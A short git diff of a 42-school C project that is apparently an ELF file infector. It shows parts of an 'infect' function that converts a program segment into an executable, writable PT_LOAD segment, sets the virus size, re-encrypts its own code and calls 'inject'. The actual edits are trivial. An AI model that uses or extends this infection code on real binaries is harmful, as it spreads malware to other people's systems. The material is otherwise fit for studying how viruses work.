@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:22:03 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/03 18:18:38 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/04 11:50:19 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -44,7 +44,7 @@ void		infect(t_data *data)
 	size_t base = data->virus.data->p_vaddr + data->virus.data->p_memsz;
 	size_t padd = base % data->virus.data->p_align;
 
-	data->virus.size = (size_t)end_of_data - (size_t)start;
+	data->virus.size = ((size_t)end_of_data - (size_t)start);
 	data->virus.note->p_type = PT_LOAD;
 	data->virus.note->p_flags = (PF_X | PF_W | PF_R);
 	data->virus.note->p_filesz = data->virus.size;
@@ -65,5 +65,6 @@ ERR:
 
 	update_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
 	revert_two(&data->key, (char*)inject, (size_t)release - (size_t)inject);
+
 	inject(data);
 }
